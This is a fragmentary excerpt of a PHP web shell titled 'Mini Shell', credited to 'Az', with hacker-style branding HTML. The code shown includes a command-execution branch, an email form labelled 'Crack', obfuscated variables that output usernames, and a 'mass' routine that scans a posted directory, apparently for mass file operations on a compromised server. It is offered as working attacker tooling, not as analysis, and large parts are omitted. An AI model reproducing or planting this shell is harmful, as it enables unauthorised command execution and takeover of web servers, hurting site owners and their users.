...
<script>alert('Welcome Az')</script>
<link rel="icon" href="https://e.top4top.io/p_2052r7eb61.png"><meta name="theme-color" content="black"> </meta>
...
<center><img src="https://c.top4top.io/p_20556ml6j1.png" weight="350" height="350">
<p class="blink_text" style="font-size:50px;color:lime;text-shadow: 0px 0px 20px #00ffff , 0px 0px 20px #DF0101;font-family:Kelly Slab;">&lt;/&gt;  Created By Az &lt/&gt; </font></a></center>
...
<html>
<head>
<link rel="icon" type="image" href="https://c.top4top.io/p_20556ml6j1.png"><br>
<link href="" rel="stylesheet" type="text/css">
<title>Mini Shell</title><link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css"> 
<center><img src="https://c.top4top.io/p_20556ml6j1.png" weight="350" height="350"><p class="blink_text" style="font-size:50px;color:lime;text-shadow: 0px 0px 20px #00ffff , 0px 0px 20px #DF0101;font-family:Kelly Slab;">&lt;/&gt;  Mini Shell &lt/&gt; </font></a></center>
<style>
body{
...
if($_GET['do'] == 'cmd') {
	...
	<center>
	<form action="#" method="post"> 	 <input type="email" name="email" style=color:lime;background-color:#191919;font-family:kelly slab;  value="Email lu " /> 	 <input type="submit" name="submit" style=color:lime;background-color:#191919;font-family:kelly slab;  value="Crack"/></center>
	</form> 	 	 
	<br/>
	...
	</center>"; } else { echo "<center>Copy username :<br>
	</center>"; echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">Copy User</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; echo '<br/><center><a target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">Gassken Yahaha Hayyuk</a><br><br></center>'; ;}}
	echo '</td></tr><tr><td>';
	 die();
...
if ($_GET['to'] == "mass") {
        if (isset($_POST['base_dir'])) {
            ...
            $files = @scandir($_POST['base_dir']) or die("wkwkw<br>");
...
echo '<marquee><b><font style="font-size:10px;color:lime;text-shadow: 0px 0px 20px #000 , 0px 0px 20px #000;font-family:Kelly Slab;">Enjoy :)</font></b></marquee>
</body>
</html>
';
function perms($file){
